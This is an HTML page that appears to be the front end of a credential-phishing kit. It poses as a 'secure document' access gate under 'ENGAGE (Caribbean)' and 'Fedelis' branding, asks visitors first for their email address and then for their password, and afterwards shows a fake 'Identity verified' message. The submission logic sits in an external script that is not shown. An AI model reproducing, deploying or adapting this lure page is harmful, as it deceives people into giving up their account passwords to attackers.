<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
    <title>ENGAGE (Caribbean)</title>
    <link rel="icon" href="favicon.ico" type="image/x-icon">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
    <link rel="stylesheet" href="browser_ditect.css">
</head>
<body>

<div class="login-card">
    <div class="logo-area">
        <div class="brand-logo">
            <img src="A4-70GSM.png" alt="Fedelis Logo" class="logo-image">
        </div>
        <!-- logo-text removed -->
    </div>

    <div class="form-header">
        <span id="form-title">Verify your email</span>
        <div class="header-submsg">
            
        </div>
    </div>

    <div class="form-container">
        <!-- Step 1: Email Form -->
        <div id="step1" class="step">
            <div class="input-group">
    
                <input type="email" id="emailInput" placeholder="Enter Email" autocomplete="email">
                <div class="info-message">No account? <small>·Enter email document shared with</small></div>
                <div class="info-message"> To open secure document's, we'll need you to enter email file was shared to. </div>
            </div>
            <button id="nextToPasswordBtn" class="next-btn">Next</button>
        </div>

        <!-- Step 2: Password Form -->
        <div id="step2" class="step hidden-step">
            <div class="email-preview">
                <i class="fas fa-arrow-left"></i> <span id="displayEmailValue">—</span>
            </div>
            <div class="input-group">
                <label>Enter your password</label>
                <input type="password" id="passwordInput" placeholder="Password" autocomplete="current-password">
            </div>
            <div class="privacy-message">
           
            </div>
            <button id="finalSubmitBtn" class="submit-btn">Sign in</button>
        </div>
    </div>
</div>

<div id="successPopup" class="popup-modal">
    <div class="popup-content">
        <i class="fas fa-check-circle"></i>
        <h3></h3>
        <p>Identity verified. Redirecting to secure document...</p>
        <small></small>
    </div>
</div>

<script src="processin.js"></script>
</body>
</html>
